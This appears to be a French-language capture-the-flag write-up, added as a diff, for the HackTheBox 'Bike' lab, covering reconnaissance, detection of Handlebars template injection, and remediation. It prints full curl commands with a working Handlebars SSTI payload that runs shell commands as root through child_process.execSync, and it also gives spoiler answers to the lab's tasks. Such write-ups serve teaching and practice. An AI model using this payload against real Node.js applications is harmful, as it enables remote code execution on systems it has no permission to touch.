@@ -1,0 +1,205 @@
+# Bike - HackTheBox Writeup
+
+![HTB Bike](https://img.shields.io/badge/HackTheBox-Bike-green)
+![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen)
+![OS](https://img.shields.io/badge/OS-Linux-blue)
+
+## Box Info
+
+| Property | Value |
+|----------|-------|
+| Name | Bike |
+| OS | Linux (Ubuntu) |
+| Difficulty | Very Easy |
+| Category | Starting Point |
+| IP | 10.129.97.64 |
+
+## Flag
+
+| Flag | Location |
+|------|----------|
+| Root | `/root/flag.txt` |
+
+---
+
+## Summary
+
+1. **Recon** : 2 ports ouverts (SSH 22, HTTP 80)
+2. **Identification** : Node.js + Express + Handlebars template engine
+3. **Exploitation** : Server-Side Template Injection (SSTI) via formulaire email
+4. **RCE** : Bypass `require is not defined` avec `process.mainModule.require`
+
+---
+
+## Reconnaissance
+
+### Nmap Scan
+
+```bash
+nmap -Pn -sV -p 22,80 10.129.97.64
+```
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
+80/tcp open  http    Node.js (Express middleware)
+```
+
+### Services identifiés
+
+| Service | Version | Notes |
+|---------|---------|-------|
+| OpenSSH | 8.2p1 | Ubuntu |
+| Node.js | Express | Middleware web |
+
+---
+
+## Enumeration
+
+### Web Application
+
+La page d'accueil affiche un formulaire pour s'inscrire à une newsletter :
+
+```html
+<form id="form" method="POST" action="/">
+  <input name="email" placeholder="E-mail"></input>
+  <button type="submit">Submit</button>
+</form>
+```
+
+### Test SSTI
+
+En soumettant `{{7*7}}` dans le champ email :
+
+```bash
+curl -s -X POST 10.129.97.64 -d 'email={{7*7}}'
+```
+
+```
+Error: Parse error on line 1:
+{{7*7}}
+--^
+Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
+    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)
+```
+
+**Découvertes** :
+- Template engine : **Handlebars**
+- Vulnérabilité : **SSTI** (Server-Side Template Injection)
+
+---
+
+## Exploitation
+
+### Payload SSTI Handlebars (HackTricks)
+
+Premier essai avec `require` :
+
+```bash
+curl -s -X POST 10.129.97.64 --data-urlencode 'email={{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('\''child_process'\'').execSync('\''id'\'');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'
+```
+
+**Erreur** : `ReferenceError: require is not defined`
+
+### Bypass avec process.mainModule
+
+Dans Node.js, `require` n'est pas disponible dans le scope global, mais on peut y accéder via `process.mainModule.require` :
+
+```bash
+curl -s -X POST 10.129.97.64 --data-urlencode 'email={{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.mainModule.require('\''child_process'\'').execSync('\''id'\'');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'
+```
+
+**Résultat** :
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### Flag
+
+```bash
+curl -s -X POST 10.129.97.64 --data-urlencode 'email={{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.mainModule.require('\''child_process'\'').execSync('\''cat /root/flag.txt'\'');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'
+```
+
+```
+[REDACTED]
+```
+
+---
+
+## Task Answers
+
+<details>
+<summary>Spoiler - Click to reveal answers</summary>
+
+| Task | Question | Answer |
+|------|----------|--------|
+| 1 | What TCP ports does nmap identify as open? | `22,80` |
+| 2 | What software is running the service listening on the http/web port? | `Node.js` |
+| 3 | What is the name of the Web Framework according to Wappalyzer? | `Express` |
+| 4 | What is the name of the vulnerability we test for by submitting {{7*7}}? | `SSTI` |
+| 5 | What is the templating engine being used within Node.JS? | `Handlebars` |
+| 6 | What is the name of the BurpSuite tab used to encode text? | `Decoder` |
+| 7 | What type of encoding do we use for special characters in HTTP? | `URL` |
+| 8 | What is "not defined" in the response error? | `require` |
+| 9 | What variable is the name of the top-level scope in Node.JS? | `global` |
+| 10 | What is the name of the user running the webserver? | `root` |
+
+</details>
+
+---
+
+## Résumé de l'attaque
+
+```
+┌─────────────────┐                           ┌─────────────────┐
+│   Attaquant     │                           │      Bike       │
+│  10.10.14.47    │                           │  10.129.97.64   │
+└────────┬────────┘                           └────────┬────────┘
+         │                                             │
+         │  1. Nmap scan                               │
+         │────────────────────────────────────────────►│
+         │  Découverte: Node.js + Express              │
+         │◄────────────────────────────────────────────│
+         │                                             │
+         │  2. Test SSTI {{7*7}}                       │
+         │────────────────────────────────────────────►│
+         │  Erreur Handlebars révélée                  │
+         │◄────────────────────────────────────────────│
+         │                                             │
+         │  3. Payload HackTricks (require)            │
+         │────────────────────────────────────────────►│
+         │  "require is not defined"                   │
+         │◄────────────────────────────────────────────│
+         │                                             │
+         │  4. Bypass: process.mainModule.require      │
+         │────────────────────────────────────────────►│
+         │  RCE as root!                               │
+         │◄────────────────────────────────────────────│
+         │                                             │
+         ▼                                             ▼
+    Root flag: [REDACTED]
+```
+
+---
+
+## Lessons Learned
+
+| Vulnerability | Description | Remediation |
+|---------------|-------------|-------------|
+| **SSTI** | User input directement passé au template engine | Sanitizer les inputs, ne jamais passer d'input utilisateur directement à `compile()` |
+| **Handlebars misconfiguration** | Template compilé côté serveur avec input utilisateur | Utiliser des templates statiques |
+| **Root web server** | Le serveur Node.js tourne en root | Utiliser un utilisateur non-privilégié |
+
+---
+
+## Outils utilisés
+
+- nmap
+- curl
+
+---
+
+## Références
+
+- [HackTricks - SSTI Handlebars](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs)
+- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
